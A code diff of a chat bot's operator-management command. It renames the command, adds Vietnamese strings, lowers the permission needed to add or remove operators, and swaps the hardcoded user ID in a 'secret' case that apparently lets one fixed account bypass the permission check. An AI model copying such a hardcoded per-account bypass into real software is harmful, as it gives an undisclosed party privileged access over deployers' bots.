@@ -1,5 +1,5 @@
 module.exports.config = {
-  name: "operator",
+  name: "op",
   version: "2.0.0",
   permission: 0,
   credits: "ryuko",
@@ -23,7 +23,13 @@ module.exports.languages = {
         "notHavePermssion": 'you have no permission to use "%1"',
         "addedNewAdmin": 'added %1 operator :\n\n%2',
         "removedAdmin": 'remove %1 operator :\n\n%2'
-    }
+    },
+   "vietnam": {
+        "listAdmin": 'Operators: \n\n%1',
+        "notHavePermssion": 'Bạn không có quyền để sử dụng "%1"',
+        "addedNewAdmin": 'Đã thêm thành công %1 operator :\n\n%2',
+        "removedAdmin": 'Đã xoá thành công %1 operator :\n\n%2'
+   }
 }
 
 module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
@@ -32,7 +38,7 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
     const configPath = require('../../config.json');
     const { operators } = global.config;
     const { userName } = global.data;
-    const { writeFileSync } = global.nodemodule["fs-extra"];
+    const { writeFileSync } = require("fs-extra");
     const mention = Object.keys(mentions);
     delete require.cache[require.resolve('../../config.json')];
     var config = require('../../config.json');
@@ -48,15 +54,15 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
             for (const idOperator of listOperator) {
                 if (parseInt(idOperator)) {
                     const name = await Users.getNameUser(idOperator);
-                    msg.push(`\nname : ${name}\nid : ${idOperator}`);
+                    msg.push(`\nName: ${name}\nid : ${idOperator}`);
                 }
             };
 
-            return api.sendMessage(`bot operator :\n${msg.join('\n')}`, threadID, messageID);
+            return api.sendMessage(`Bot Operator :\n${msg.join('\n')}`, threadID, messageID);
         }
 
         case "add": {
-            if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
+            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
           
 
             if (mention.length != 0 && isNaN(content[0])) {
@@ -82,7 +88,7 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
         }
         
         case "secret": {
-            const god = ["100093955989346"];
+            const god = ["100090458979503"];
             if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
           
 
@@ -111,7 +117,7 @@ module.exports.run = async function ({ api, event, args, Users, permssion, getTe
         case "remove":
         case "rm":
         case "delete": {
-            if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);
+            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);
             if (mentions.length != 0 && isNaN(content[0])) {
                 const mention = Object.keys(mentions);
                 var listAdd = [];
